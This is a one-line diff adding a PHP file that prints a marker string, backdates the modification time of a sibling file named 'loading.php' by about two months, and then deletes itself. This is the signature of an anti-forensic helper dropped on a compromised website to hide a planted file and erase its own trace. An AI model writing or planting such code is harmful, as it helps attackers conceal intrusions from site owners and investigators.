@@ -1,0 +1,1 @@
+<?php echo "tNTBDmWSND"; if (file_exists("./loading.php")){ touch("./loading.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*uefR7H687rSbk7kFp8dD*/ ?>
